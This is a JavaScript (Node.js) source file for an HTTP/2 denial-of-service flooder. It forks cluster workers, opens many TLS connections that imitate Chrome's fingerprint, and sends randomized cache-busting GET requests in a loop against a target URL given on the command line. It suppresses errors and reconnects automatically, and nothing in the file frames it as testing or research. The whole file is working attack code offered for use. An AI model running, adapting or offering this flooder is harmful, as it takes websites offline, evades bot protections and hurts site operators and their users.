const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const EventEmitter = require('events');
const os = require('os');

EventEmitter.defaultMaxListeners = 0;

const MAX_CONCURRENT_STREAMS_PER_WORKER = 150;

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "ecdsa_secp521r1_sha512",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const secureOptionsList = [
    crypto.constants.SSL_OP_NO_RENEGOTIATION,
    crypto.constants.SSL_OP_NO_TICKET,
    crypto.constants.SSL_OP_NO_SSLv2,
    crypto.constants.SSL_OP_NO_SSLv3,
    crypto.constants.SSL_OP_NO_COMPRESSION,
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
    crypto.constants.SSL_OP_TLSEXT_PADDING,
    crypto.constants.SSL_OP_ALL
];

function parseArguments() {
    const args = {
        target: null,
        time: 30,
        rate: 8,
        threads: 2,
        cookieCount: 5,
        customCookie: '',
        customUA: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        customReferer: ''
    };

    const positional = [];
    for (let i = 2; i < process.argv.length; i++) {
        if (!process.argv[i].startsWith('--')) {
            positional.push(process.argv[i]);
        } else {
            break;
        }
    }

    if (positional.length >= 1) args.target = positional[0];
    if (positional.length >= 2) args.time = parseInt(positional[1]);
    if (positional.length >= 3) args.rate = parseInt(positional[2]);
    if (positional.length >= 4) args.threads = parseInt(positional[3]);
    if (positional.length >= 5) args.cookieCount = parseInt(positional[4]);

    for (let i = 2; i < process.argv.length; i++) {
        const arg = process.argv[i];
        if (arg === '--cookie' && process.argv[i+1]) {
            args.customCookie = process.argv[i+1];
            i++;
        } else if (arg === '--ua' && process.argv[i+1]) {
            args.customUA = process.argv[i+1];
            i++;
        } else if (arg === '--referer' && process.argv[i+1]) {
            args.customReferer = process.argv[i+1];
            i++;
        }
    }

    if (!args.target) {
        process.exit(1);
    }

    args.time = isNaN(args.time) ? 30 : args.time;
    args.rate = isNaN(args.rate) ? 8 : args.rate;
    args.threads = isNaN(args.threads) ? 2 : args.threads;
    args.cookieCount = isNaN(args.cookieCount) ? 5 : args.cookieCount;

    return args;
}

function flood(userAgent, cookie, referer, workerId, args) {
    try {
        let parsed = url.parse(args.target);
        let path = parsed.pathname || '/';
        let query = parsed.search || '';

        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        let intervalTime = randomDelay(2000, 5000);

        function getChromeVersion(userAgent) {
            const chromeVersionRegex = /Chrome\/([\d.]+)/;
            const match = userAgent.match(chromeVersionRegex);
            if (match && match[1]) {
                return match[1];
            }
            return "126.0.0.0";
        }

        const chromever = getChromeVersion(userAgent);
        const randValue = list => list[Math.floor(Math.random() * list.length)];
        const lang_header1 = [
            "en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9",
            "id-ID,id;q=0.9", "ms-MY,ms;q=0.9", "ja-JP,ja;q=0.9", "ko-KR,ko;q=0.9"
        ];

        const randomQuery = () => {
            return `?_=${Date.now()}&r=${Math.random()}&s=${crypto.randomBytes(4).toString('hex')}`;
        };

        const headers = {
            ':method': 'GET',
            ':path': path + (query || '') + randomQuery(),
            ':authority': parsed.host,
            ':scheme': 'https',
            'user-agent': userAgent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': randValue(lang_header1),
            'accept-encoding': 'gzip, deflate, br',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'x-request-id': `${workerId}-${Date.now()}-${Math.random()}`,
            'sec-ch-ua': `"Chromium";v="${chromever.split('.')[0]}", "Not)A;Brand";v="8", "Chrome";v="${chromever.split('.')[0]}"`,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': 'Windows'
        };

        if (cookie && cookie.trim() !== '') {
            headers['cookie'] = cookie;
        }

        if (referer && referer.trim() !== '') {
            headers['referer'] = referer;
        }

        function createCustomTLSSocket(parsed) {
            const tlsSocket = tls.connect({
                host: parsed.hostname,
                port: 443,
                servername: parsed.hostname,
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3",
                ALPNProtocols: ["h2", "http/1.1"],
                ciphers: ciphers,
                sigalgs: sigalgs.join(':'),
                ecdhCurve: "X25519:P-256:P-384",
                secureOptions: secureOptionsList[Math.floor(Math.random() * secureOptionsList.length)],
                rejectUnauthorized: false
            });
            tlsSocket.on('error', () => {});
            return tlsSocket;
        }

        const tlsSocket = createCustomTLSSocket(parsed);
        tlsSocket.on('error', () => {
            if(!tlsSocket.destroyed) tlsSocket.destroy();
        });

        const client = http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                maxConcurrentStreams: 1000
            },
            peerMaxConcurrentStreams: 1000
        });

        let requestLoop;

        client.on("connect", () => {
            requestLoop = setInterval(() => {
                if (client.destroyed || client.closed) {
                    clearInterval(requestLoop);
                    return;
                }

                for (let i = 0; i < args.rate; i++) {
                    const newPath = path + (query || '') + randomQuery();
                    const requestHeaders = { ...headers, ':path': newPath };

                    const request = client.request(requestHeaders, {
                        weight: Math.random() < 0.5 ? 42 : 256,
                        exclusive: false,
                        parent: 0
                    });

                    request.on("response", (res) => {
                        request.on('data', () => {});
                        request.on('end', () => {});
                    });

                    request.on("error", (err) => {});
                    
                    request.end();
                }
            }, intervalTime);
        });

        client.on("close", () => {
            if (!client.destroyed) client.destroy();
            setTimeout(() => flood(userAgent, cookie, referer, workerId, args), 3000);
        });

        client.on("error", (error) => {
            if (!client.destroyed) client.destroy();
        });

        process.on('SIGINT', () => {
            clearInterval(requestLoop);
            if (!client.destroyed) client.destroy();
        });
        
    } catch (err) {}
}

function runFlooder(workerId, args) {
    const cookie = args.customCookie || "";
    const userAgent = args.customUA || "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
    const referer = args.customReferer || "";
    
    flood(userAgent, cookie, referer, workerId, args);
}

const args = parseArguments();

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) {
        const worker = cluster.fork();
        worker.send({ 
            type: 'start',
            args: args,
            workerId: i
        });
    }
    
    setTimeout(() => {
        process.exit(0);
    }, args.time * 1000);
    
} else {
    process.on('message', (msg) => {
        if (msg.type === 'start') {
            const workerArgs = msg.args;
            const workerId = msg.workerId || 0;
            
            global.workerArgs = workerArgs;
            
            for (let i = 0; i < MAX_CONCURRENT_STREAMS_PER_WORKER; i++) {
                setTimeout(() => runFlooder(workerId, workerArgs), i * 50);
            }
        }
    });
}

process.on('uncaughtException', (e) => {});
process.on('unhandledRejection', (e) => {});

module.exports = {};
